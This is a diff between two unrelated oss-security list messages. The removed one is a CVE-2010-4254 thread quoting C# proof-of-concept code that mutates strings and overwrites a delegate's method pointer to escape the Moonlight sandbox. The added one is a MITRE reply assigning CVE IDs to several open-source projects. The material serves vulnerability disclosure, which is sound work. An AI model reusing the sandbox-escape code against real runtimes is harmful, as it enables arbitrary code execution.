@@ -1,162 +1,68 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/11/29/3
-Message-ID: <1544809689.736861291062980367.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
-Date: Mon, 29 Nov 2010 15:36:20 -0500 (EST)
-From: Josh Bressers <bressers@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/06/24/5
+Message-ID: <Pine.GSO.4.64.1006241208380.19279@faron.mitre.org>
+Date: Thu, 24 Jun 2010 12:16:37 -0400 (EDT)
+From: "Steven M. Christey" <coley@...us.mitre.org>
 To: oss-security@...ts.openwall.com
-Cc: coley <coley@...re.org>
-Subject: Re: CVE request: mono/moonlight: execution of arbitrary code due to mutable Strings
+Subject: Re: CVE requests: maradns, freeciv, rbot, gitolite, gource, shib, kvirc
 Content-Type: text/plain; charset=utf-8
 
-Please use CVE-2010-4254 for this.
 
-Thanks.
+On Thu, 10 Jun 2010, Moritz Muehlenhoff wrote:
 
--- 
-    JB
+> Hi,
+> Please assign CVE IDs for these issues current present in the Debian
+> Security Tracker, but for which no CVE IDs have been assigned so far:
+>
+> 1. maradns
+> http://maradns.org/download/maradns-1.4.02-parse_segfault.patch
+> Fixed in 1.4.03
+
+Use CVE-2010-2444
+
+> 2. freeciv
+> http://gna.org/bugs/?15624
+> Fixed in 2.2.1 and 2.3.0
+
+Use CVE-2010-2445
+
+> 3. rbot (http://ruby-rbot.org/)
+> http://www.securityfocus.com/archive/1/509719/30/0/threaded
+
+Use CVE-2010-2446
+
+> 4. gitolite
+> http://secunia.com/advisories/39587/
+> http://github.com/sitaramc/gitolite/commit/1e06fea3b6959faeb72d8dca46cd4753ada48637
+> http://github.com/sitaramc/gitolite/commit/5fd9328c1cd1e7c576b6530b3253061c68b159aa
+
+These two appear to be about "not filtering src/ or hooks/ from pathnames"
+
+Use CVE-2010-2447
+> http://github.com/sitaramc/gitolite/commit/5deffee3cff5f9a13c59b8c1e357c5a32487d1c3
+
+This is OS command injection
+
+Use CVE-2010-2448
+
+> 5. gource
+> http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=577958
+
+Use CVE-2010-2449
+
+> 6. Shibboleth:
+> http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=571631
+
+Use CVE-2010-2450
+
+> 7. kvirc
+> http://lists.omnikron.net/pipermail/kvirc/2010-May/000867.html
+
+format strings - CVE-2010-2451
+
+directory traversal - CVE-2010-2452
 
 
------ "Thomas Biege" <thomas@...e.de> wrote:
+All will be filled in later.
 
-> Hello.
-> 
-> Just a copy-n-paste from our bugzilla (again):
-> 
-> ------------------------------------------------------------------------------
-> SP 2010-11-24 20:45:21 UTC
-> 
-> Original (pulled by author) blog entry:
-> 
-> So I was messing around with generic methods and discovered that
-> generic
-> constraints can be bypassed on Mono 2.6.7 and 2.8 using reflection
-> (with the
-> exception of the new() constraint). One of the fun results of this bug
-> is that
-> the String class can be made mutable without using reflection to set
-> private
-> members!
-> 
-> The following code demonstrates this; it is legal and will run on Mono
-> up to
-> and including version 2.8:
-> 
-> using System;
-> using System.Reflection;
-> 
-> public class FakeString {
->     public int length;
->     public char start_char;
-> }
-> 
-> public class TestCase {
->     private static FakeString UnsafeConversion<T>(T thing)
->         where T : FakeString
->     {
->         return thing;
->     }
-> 
->     public static void Main() {
->         var a = "foo";
->         var b = MakeMutable(a);
-> 
->         Console.WriteLine(a);
->         b.start_char = 'b';
->         Console.WriteLine(a);
->     }
-> 
->     private static FakeString MakeMutable(string s)
->     {
->         var m = typeof(TestCase).GetMethod("UnsafeConversion",
-> BindingFlags.NonPublic | BindingFlags.Static);
->         var m2 = m.MakeGenericMethod(typeof(string));
-> 
->         var d = (Func<string,
-> FakeString>)Delegate.CreateDelegate(typeof(Func<string, FakeString>),
-> null,
-> m2);
-> 
->         return d(s);
->     }
-> }
-> 
-> 
-> 
-> Comment 1 SP 2010-11-24 20:54:20 UTC
-> 
-> This is a follow up of the previous
-> https://bugzilla.novell.com/show_bug.cgi?id=654136
-> 
-> The original blog entry allow trusted (by moonlight) code to mutate
-> strings
-> which could be used to trick policies (e.g. give a valid URL and, once
-> 
-> accepted
-> as a valid xdomain URL, change it to something else).
-> 
-> It can also be extended to arbitrary code execution. POC by Geoff
-> Norton: 
-> 
-> using System;
-> using System.Reflection;
-> using System.Runtime.InteropServices;
-> 
-> public class DelegateWrapper {
->     public IntPtr method_ptr;
-> }
-> 
-> public delegate void MethodWrapper ();
-> 
-> public class BreakSandbox {
->     private static DelegateWrapper Convert <T> (T dingus) where T :
-> DelegateWrapper {
->         return dingus;
->     }
-> 
->     private static DelegateWrapper ConvertDelegate (Delegate del) {
->         var m = typeof (BreakSandbox).GetMethod ("Convert",
-> BindingFlags.NonPublic | BindingFlags.Static);
->         var gm = m.MakeGenericMethod (typeof (Delegate));
-> 
->         var d = (Func <Delegate, DelegateWrapper>)
-> Delegate.CreateDelegate
-> (typeof (Func <Delegate, DelegateWrapper>), null, gm);
-> 
->         return d (del);
->     }
-> 
->     public static void Main (string [] args) {
->         MethodWrapper d = delegate {
->             Console.WriteLine ("Hello");
->         };
-> 
->         d ();
->         var converted = ConvertDelegate (d);
->         // Overwrite the already WX page with a 'ret'
->         Marshal.WriteByte (converted.method_ptr, (byte) 0xc3);
->         d ();
->     }
-> }
-> 
-> This code won't execute on Moonlight (since all Marshal.* code is
-> SecurityCritical) but it would not be hard to modify the POC to do the
-> same
-> without SecurityCritical code.
-> 
-> Note: the bug is present in Mono but does not represent a security
-> vulnerability there since Mono (unlike Moonlight) can only execute
-> trusted
-> code.
-> 
-> [reply] [-]
-> Private
-> Comment 2 
-> ------------------------------------------------------------------------------
-> 
-> -- 
->  Thomas Biege <thomas@...e.de>, SUSE LINUX, Security Support &
-> Auditing
->  SUSE LINUX Products GmbH, GF: Markus Rex, HRB 16746 (AG Nuernberg)
-> --
->   Wer aufhoert besser werden zu wollen, hoert auf gut zu sein.
->                             -- Marie von Ebner-Eschenbach
+- Steve
